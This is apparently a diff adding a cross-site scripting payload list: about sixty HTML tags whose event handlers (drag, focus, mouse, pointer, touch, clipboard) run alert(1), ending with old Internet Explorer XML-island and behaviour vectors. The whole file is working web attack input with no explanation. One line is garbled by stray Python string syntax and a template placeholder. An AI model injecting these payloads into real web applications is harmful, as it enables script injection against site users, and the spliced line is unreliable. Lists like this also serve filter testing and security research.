@@ -1,0 +1,60 @@
+<html draggable="true" ondrag="alert(1)">test</html>
+<html draggable="true" ondragend="alert(1)">test</html>
+<html draggable="true" ondragenter="alert(1)">test</html>
+<html draggable="true" ondragleave="alert(1)">test</html>
+<html draggable="true" ondragstart="alert(1)">test</html>
+<html id=x tabindex=1 onactivate=alert(1)></html>
+<html id=x tabindex=1 onbeforeactivate=alert(1)></html>
+<html id=x tabindex=1 onbeforedeactivate=alert(1)></html><input autofocus>
+<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>
+<html id=x tabindex=1 onfocus=alert(1)></html>
+<html id=x tabindex=1 onfocusin=alert(1)></html>
+<html onafterscriptexecute=alert(1)><script>1</script>
+<html onbeforecopy="alert(1)" contenteditable>test</html>
+<html onbeforecut="alert(1)" contenteditable>test</html>
+<html onbeforepaste="alert(1)" contenteditable>test</html>
+<html onbeforescriptexecute=alert(1)><script>1</script>
+<html onblur=alert(1) tabindex=1 id=x></html><input autofocus>
+<html onclick="alert(1)">test</html>
+<html oncontextmenu="alert(1)">test</html>
+<html oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<html oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<html ondblclick="alert(1)" autofocus tabindex=1>test</html>
+<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>
+<html onkeydown="alert(1)" contenteditable>test</html>
+<html onkeypress="alert(1)" contenteditable>test</html>
+<html onkeyup="alert(1)" contenteditable>test</html>
+<html onmousedown="alert(1)">test</html>
+<html onmouseenter="alert(1)">test</html>
+<html onmouseleave="alert(1)">test</html>
+<html onmousemove="alert(1)">test</html>
+<html onmouseout="alert(1)">test</html>
+<html onmouseover="alert(1)">test</html>
+<html onmouseup="alert(1)">test</html>
+<html onmousewheel=alert(1)>requires scrolling
+<html onpaste="alert(1)" contenteditable>test</html>
+<html onpointerdown=alert(1)>XSS</html>
+<html onpointerenter=alert(1)>XSS</html>
+<html onpointerleave=alert(1)>XSS</html>
+<html onpointermove=alert(1)>XSS</html>
+<html onpointerout=alert(1)>XSS</html>
+<html onpointerover=alert(1)>XSS</html>
+<html onpointerrawupdate=alert(1)>XSS</html>
+<html onpointerup=alert(1)>XSS</html>
+<html ontouchstart=alert(1)>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
+<html ontouchcancel=alert(1)>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
+<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
+<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
+<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
+<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
+<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
+<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
+<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
+<HTML xmlns:xss><?import namespace="xss" implementation="%(htc)s"><xss:xss>XSS</xss:xss></HTML>""","XML namespace."),("""<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
+
